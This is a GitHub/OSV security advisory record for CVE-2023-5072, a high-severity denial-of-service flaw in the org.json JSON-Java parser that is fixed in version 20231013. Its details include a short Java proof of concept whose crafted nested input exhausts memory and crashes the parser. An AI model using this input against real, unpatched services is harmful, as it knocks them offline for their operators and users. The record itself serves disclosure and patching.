{
	"schema_version": "1.6.0",
	"id": "GHSA-4jq9-2xhw-jpx7",
	"modified": "2024-02-16T08:22:14.901634Z",
	"published": "2023-11-14T22:24:08Z",
	"aliases": [
		"CVE-2023-5072"
	],
	"summary": "Java: DoS Vulnerability in JSON-JAVA",
	"details": "### Summary\nA denial of service vulnerability in JSON-Java was discovered by [ClusterFuzz](https://google.github.io/clusterfuzz/).  A bug in the parser means that an input string of modest size can lead to indefinite amounts of memory being used. There are two issues: (1) the parser bug can be used to circumvent a check that is supposed to prevent the key in a JSON object from itself being another JSON object; (2) if a key does end up being a JSON object then it gets converted into a string, using `\\` to escape special characters, including `\\` itself. So by nesting JSON objects, with a key that is a JSON object that has a key that is a JSON object, and so on, we can get an exponential number of `\\` characters in the escaped string.\n\n### Severity\nHigh - Because this is an already-fixed DoS vulnerability, the only remaining impact possible is for existing binaries that have not been updated yet.\n\n### Proof of Concept\n```java\npackage orgjsonbug;\n\nimport org.json.JSONObject;\n\n/**\n * Illustrates a bug in JSON-Java.\n */\npublic class Bug {\n  private static String makeNested(int depth) {\n    if (depth == 0) {\n      return \"{\\\"a\\\":1}\";\n    }\n    return \"{\\\"a\\\":1;\\t\\0\" + makeNested(depth - 1) + \":1}\";\n  }\n\n  public static void main(String[] args) {\n    String input = makeNested(30);\n    System.out.printf(\"Input string has length %d: %s\\n\", input.length(), input);\n    JSONObject output = new JSONObject(input);\n    System.out.printf(\"Output JSONObject has length %d: %s\\n\", output.toString().length(), output);\n  }\n}\n```\nWhen run, this reports that the input string has length 367. Then, after a long pause, the program crashes inside new JSONObject with OutOfMemoryError.\n\n### Further Analysis\nThe issue is fixed by [this PR](https://github.com/stleary/JSON-java/pull/759).\n\n### Timeline\n**Date reported**: 07/14/2023\n**Date fixed**: \n**Date disclosed**: 10/12/2023",
	"affected": [
		{
			"package": {
				"ecosystem": "Maven",
				"name": "org.json:json",
				"purl": "pkg:maven/org.json/json"
			},
			"ranges": [
				{
					"type": "ECOSYSTEM",
					"events": [
						{
							"introduced": "0"
						},
						{
							"fixed": "20231013"
						}
					]
				}
			],
			"versions": [
				"20070829",
				"20080701",
				"20090211",
				"20131018",
				"20140107",
				"20141113",
				"20150729",
				"20151123",
				"20160212",
				"20160807",
				"20160810",
				"20170516",
				"20171018",
				"20180130",
				"20180813",
				"20190722",
				"20200518",
				"20201115",
				"20210307",
				"20211205",
				"20220320",
				"20220924",
				"20230227",
				"20230618"
			],
			"database_specific": {
				"last_known_affected_version_range": "<= 20230618",
				"source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/11/GHSA-4jq9-2xhw-jpx7/GHSA-4jq9-2xhw-jpx7.json"
			}
		}
	],
	"references": [
		{
			"type": "WEB",
			"url": "https://github.com/google/security-research/security/advisories/GHSA-4jq9-2xhw-jpx7"
		},
		{
			"type": "ADVISORY",
			"url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5072"
		},
		{
			"type": "WEB",
			"url": "https://github.com/stleary/JSON-java/issues/758"
		},
		{
			"type": "WEB",
			"url": "https://github.com/stleary/JSON-java/issues/771"
		},
		{
			"type": "WEB",
			"url": "https://github.com/stleary/JSON-java/pull/759"
		},
		{
			"type": "WEB",
			"url": "https://github.com/stleary/JSON-java/commit/60662e2f8384d3449822a3a1179bfe8de67b55bb"
		},
		{
			"type": "PACKAGE",
			"url": "https://github.com/stleary/JSON-java"
		}
	],
	"database_specific": {
		"cwe_ids": [
			"CWE-358"
		],
		"github_reviewed": true,
		"github_reviewed_at": "2023-11-14T22:24:08Z",
		"nvd_published_at": null,
		"severity": "HIGH"
	}
}
